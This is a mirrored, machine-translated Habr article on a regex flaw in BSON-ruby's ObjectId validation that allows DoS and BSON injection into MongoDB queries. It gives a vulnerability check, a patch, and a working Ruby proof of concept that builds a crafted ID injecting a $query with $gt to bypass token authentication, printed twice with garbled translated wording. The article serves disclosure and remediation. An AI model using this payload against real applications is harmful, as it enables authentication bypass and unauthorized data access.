<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>BSON injection in MongoDB adapter for Ruby</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="A bug was found in BSON-ruby, which at best led to a small DoS, but most versions were vulnerable to BSON injection (the SQL injection analog, BSON is...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>BSON injection in MongoDB adapter for Ruby</h1><div class="post__text post__text-html js-mediator-article">  A bug was found in BSON-ruby, which at best led to a small DoS, but most versions were vulnerable to BSON injection (the SQL injection analog, BSON is the binary JSON analog used for working with the database). <br><br>  On Habr√©, the feature of regulars in Ruby was already <a href="http://habrahabr.ru/post/144139/">mentioned</a> - in our case, ^ $ means not just the beginning and end of the line, but also a new line \ n. <br><br>  But then in the examples there were only XSS ‚Äújavascript: a () \ nhttp: //‚Äù, and I have been looking for an example for a long time when regulars lead to something serious.  And a couple of days ago, during the audit of our client‚Äôs external libraries, I came across the following code in BSON-ruby. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre><code class="bash hljs">def legal?(str) !!str.match(/^[0-9a<span class="hljs-_"><span class="hljs-_">-f</span></span>]{24}$/i) end</code> </pre> <a name="habracut"></a><br>  This method is responsible for validating the ObjectId - document identifier.  For example Order.find (params [: id]) where id is 24 characters from the user of the input form "21141c78d99f23d5f34d3201". <br><br>  After a little investigation, I found out that the regular season was fixed for the first time in 2012 at \ A \ Z, then re-broken by the maintainer himself in 2013 as a result of a <a href="https://github.com/mongodb/bson-ruby/commit/21141c78d99f23d5f34d32010557ef19d0f77203">very suspicious regression</a> . <br><br>  In other words, from April 17, 2012 to March 2013 were used ^ $, then \ A \ Z until April 2013, and then again ^ $. <br><br>  To check if your application is vulnerable, run: <br><br><pre> <code class="bash hljs">b=((defined?(Moped::BSON) ? Moped::BSON : BSON)::ObjectId) raise <span class="hljs-string"><span class="hljs-string">"DoS!"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> b.legal? <span class="hljs-string"><span class="hljs-string">"a"</span></span>*24+<span class="hljs-string"><span class="hljs-string">"\n"</span></span> raise <span class="hljs-string"><span class="hljs-string">"Injection!"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> b.legal? <span class="hljs-string"><span class="hljs-string">"a"</span></span>*24+<span class="hljs-string"><span class="hljs-string">"\na"</span></span></code> </pre><br>  And use this patch if yes: <br><br><pre> <code class="bash hljs">def ((defined?(Moped::BSON) ? Moped::BSON : BSON)::ObjectId).legal?(s) /\A\h{24}\z/ === s.to_s end</code> </pre><br>  If you use the old version of BSON from 2013, then, most likely, \ A \ Z is used there and only a small DoS is possible.  Why?  Because \ Z in ruby, in addition to ending the line, allows one \ n at the end.  But if we send id = aaaaaaaaaaaaaaaaaaaaaaaa% 0A then the Mongo will swear <b>[conn1] Assertion: 10307: Client Error: bad object in message: invalid bs type in object with _id: ObjectId ('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</b> <br><br>  However, Ruby's driver does not understand this error and concludes that the node is lying.  And it pings Mongo another 39 times over the next 5 seconds, scoring a workman with useless work, which can be used as Denial of Service for some sites. <br><br>  But this is nothing compared to what is happening in the latest versions of BSON.  There you can send a string like <br><br>  _id = Any binary data \ naaaaaaaaaaaaaaaaaaaaaaaa \ nAny binary data <br><br>  What will be unpacked from hex into binary and inserted into the BSON body of the document upon request to the Mongo without changes (it is assumed that the ObjectId is already validated and inserted for its performance in its pure form).  With this Proof of Concept, you can make arbitrary requests to Mongo by overwriting the parameters of the BSON document, bypassing authentication systems based on tokens or key APIs, doing DoS, and possibly much more. <br><br><pre> <code class="bash hljs">require <span class="hljs-string"><span class="hljs-string">'uri'</span></span> b = BSON::Document.new b[<span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$query</span></span></span><span class="hljs-string">"</span></span>] = {<span class="hljs-string"><span class="hljs-string">"token"</span></span> =&gt; {<span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$gt</span></span></span><span class="hljs-string">"</span></span>=&gt;<span class="hljs-string"><span class="hljs-string">""</span></span>}} payload = b.to_bson[4..-2] id_ish = (<span class="hljs-string"><span class="hljs-string">"\n\n"</span></span> + <span class="hljs-string"><span class="hljs-string">"a"</span></span>*24 + <span class="hljs-string"><span class="hljs-string">"\n\n"</span></span>) fake_id = <span class="hljs-string"><span class="hljs-string">"a"</span></span>*24 + <span class="hljs-string"><span class="hljs-string">"\x02_id\0"</span></span>.unpack(<span class="hljs-string"><span class="hljs-string">'H*'</span></span>)[0] + [id_ish.size/2 + 1].pack(<span class="hljs-string"><span class="hljs-string">'V'</span></span>).unpack(<span class="hljs-string"><span class="hljs-string">'H*'</span></span>)[0] + id_ish + <span class="hljs-string"><span class="hljs-string">"00"</span></span> + payload.unpack(<span class="hljs-string"><span class="hljs-string">'H*'</span></span>)[0] puts URI.encode(fake_id) <span class="hljs-comment"><span class="hljs-comment"># looks like: # aaaaaaaaaaaaaaaaaaaaaaaa025f6964000f000000%0A%0Aaaaaaaaaaaaaaaaaaaaaaaaa%0A%0A0003247175657279001b00000003746f6b656e000f000000022467740001000000000000 User.find fake_id #returns &lt;User _id: 556f840f686f6d6746000000, token: "a"&gt;</span></span></code> % 0A0003247175657279001b00000003746f6b656e000f000000022467740001000000000000 <code class="bash hljs">require <span class="hljs-string"><span class="hljs-string">'uri'</span></span> b = BSON::Document.new b[<span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$query</span></span></span><span class="hljs-string">"</span></span>] = {<span class="hljs-string"><span class="hljs-string">"token"</span></span> =&gt; {<span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$gt</span></span></span><span class="hljs-string">"</span></span>=&gt;<span class="hljs-string"><span class="hljs-string">""</span></span>}} payload = b.to_bson[4..-2] id_ish = (<span class="hljs-string"><span class="hljs-string">"\n\n"</span></span> + <span class="hljs-string"><span class="hljs-string">"a"</span></span>*24 + <span class="hljs-string"><span class="hljs-string">"\n\n"</span></span>) fake_id = <span class="hljs-string"><span class="hljs-string">"a"</span></span>*24 + <span class="hljs-string"><span class="hljs-string">"\x02_id\0"</span></span>.unpack(<span class="hljs-string"><span class="hljs-string">'H*'</span></span>)[0] + [id_ish.size/2 + 1].pack(<span class="hljs-string"><span class="hljs-string">'V'</span></span>).unpack(<span class="hljs-string"><span class="hljs-string">'H*'</span></span>)[0] + id_ish + <span class="hljs-string"><span class="hljs-string">"00"</span></span> + payload.unpack(<span class="hljs-string"><span class="hljs-string">'H*'</span></span>)[0] puts URI.encode(fake_id) <span class="hljs-comment"><span class="hljs-comment"># looks like: # aaaaaaaaaaaaaaaaaaaaaaaa025f6964000f000000%0A%0Aaaaaaaaaaaaaaaaaaaaaaaaa%0A%0A0003247175657279001b00000003746f6b656e000f000000022467740001000000000000 User.find fake_id #returns &lt;User _id: 556f840f686f6d6746000000, token: "a"&gt;</span></span></code> </pre><br>  As a result, the request with the injection enters the Mongo socket as follows: <br><br>  \ x83 \ x00 \ x00 \ x00 \ x02 \ x00 \ x00 \ x00 \ x00 \ x00 \ x00 \ x00 \ xD4 \ a \ x00 \ x00 \ x00 \ x00 \ x00 \ x00 mng_development.users \ x00 \ x00 \ x00 \ x00 \ x00 \ x00 \ x00 \ x00 \ x00Q \ x00 \ x00 \ x00 \ a_id <b>\ x00 \ xAA \ xAA \ xAA \ xAA \ xAA \ xAA \ xAA \ xAA \ xAA \ xAA \ xAA \ xAA \ x02_id \ x00 \ x0F \ x00 \ x00 \ x00 \ xAA \ xAA \ xAA \ xAA \ xAA \ xAA \ xAA \ xAA \ xAA \ xAA \ xAA \ xAA \ xAA \ xAA \ x00 \ x03 $ query \ x00 \ e \ x00 \ x00 \ x00 \ x03token \ x00 \ x0F \ x00 \ x00 \ x00 \ x02 $ gt \ x00 \ x01</b> \ x00 \ x00 \ x00 \ x00 \ x00 \ x00 \ x00 <br><br>  Apply the patch, and remember that in regulars in ruby ‚Äã‚Äãyou should always use \ A \ z. </div><p>Source: <a href="https://habr.com/ru/post/259569/">https://habr.com/ru/post/259569/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../259559/index.html">Investigating a single hack or how to quickly and easily spend a billion</a></li>
<li><a href="../259561/index.html">A selection of courses on the development of games from Microsoft</a></li>
<li><a href="../259563/index.html">Localization RC (C ++, MFC, Win32)</a></li>
<li><a href="../259565/index.html">Talking with first customers</a></li>
<li><a href="../259567/index.html">Setting an object property using lambda expressions</a></li>
<li><a href="../259573/index.html">Whether it is necessary to move to a hosting in Russia, or Fault tolerance on 242-FZ</a></li>
<li><a href="../259575/index.html">Watch networks of the past</a></li>
<li><a href="../259577/index.html">Integration of symfony 2 and google calendar</a></li>
<li><a href="../259579/index.html">Controlling the volume of a multi-zone amplifier with an Android and Arduino application</a></li>
<li><a href="../259583/index.html">OpenCV 3.0 release with Python 3 support</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>